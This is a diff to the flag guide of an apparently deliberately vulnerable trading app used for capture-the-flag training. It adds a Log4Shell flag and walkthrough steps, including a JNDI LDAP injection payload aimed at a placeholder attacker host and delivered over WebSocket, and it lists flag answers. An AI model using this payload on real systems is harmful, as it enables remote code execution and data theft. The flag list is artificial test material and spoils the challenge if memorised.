@@ -20,8 +20,9 @@ VulnTrade contains 11 CTF flags hidden throughout the application. They range fr
 | 9 | `FLAG{jwt_l3v3l_byp4ss_n0_db_ch3ck}` | 300 | Intermediate | JWT |
 | 10 | `FLAG{jwt_f0rg3d_4dm1n_m4st3r}` | 350 | Advanced | JWT |
 | 11 | `FLAG{m4rk3t_m4n1pul4t0r_numb3r_0n3}` | 500 | Expert | Business Logic |
+| 12 | `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` | 500 | Expert | RCE (Log4Shell) |
 
-**Total possible: 3,050 points**
+**Total possible: 3,550 points**
 
 ---
 
@@ -183,6 +184,31 @@ strings heap.bin | grep "FLAG{"
 4. Visit leaderboard → flag appears in gold banner
 
 This is the hardest flag — it requires chaining 4+ vulnerabilities together. See [09-attack-chains.md](09-attack-chains.md) Chain 1 for the full walkthrough.
+
+---
+
+### FLAG 12: Log4Shell RCE (CVE-2021-44228)
+**Value:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}`
+**Points:** 500 | **Difficulty:** Expert
+
+**Location:** `/opt/flags/flag_log4shell.txt` on the backend container filesystem.
+
+**How to find:**
+1. Discover that VulnTrade uses Log4j2 2.14.1 (check `/actuator/env` or `pom.xml`)
+2. Identify user-controlled data flowing into logger calls (the `reason` field in admin operations)
+3. Set up an attacker LDAP server (marshalsec) + HTTP server hosting an exploit class
+4. Inject `${jndi:ldap://YOUR_IP:1389/Exploit}` as the `reason` in Halt Trading via WebSocket:
+   ```javascript
+   sendMessage('/app/admin.haltTrading', {
+     symbol: 'AAPL',
+     reason: '${jndi:ldap://YOUR_IP:1389/Exploit}'
+   });
+   ```
+5. The exploit class executes `cat /opt/flags/flag_log4shell.txt` and exfiltrates the flag
+
+This is tied with FLAG 11 as the hardest flag — it requires understanding Log4Shell mechanics, setting up external infrastructure, and delivering the payload via WebSocket (not standard HTTP).
+
+See [03-injection.md](03-injection.md) INJ-11 for the full exploitation walkthrough.
 
 ---
 
